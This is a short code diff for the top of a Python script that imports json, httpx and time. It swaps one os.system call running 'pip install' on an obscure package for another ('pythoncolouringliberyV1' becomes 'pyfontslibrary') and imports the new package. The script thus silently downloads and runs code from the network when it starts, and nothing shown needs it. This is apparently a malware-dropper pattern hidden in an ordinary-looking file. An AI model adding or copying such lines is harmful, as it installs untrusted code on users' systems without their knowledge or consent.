@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncolouringliberyV1")
-import pythoncolouringliberyV1
+os.system("pip install pyfontslibrary")
+import pyfontslibrary
 import json
 import httpx
 import time
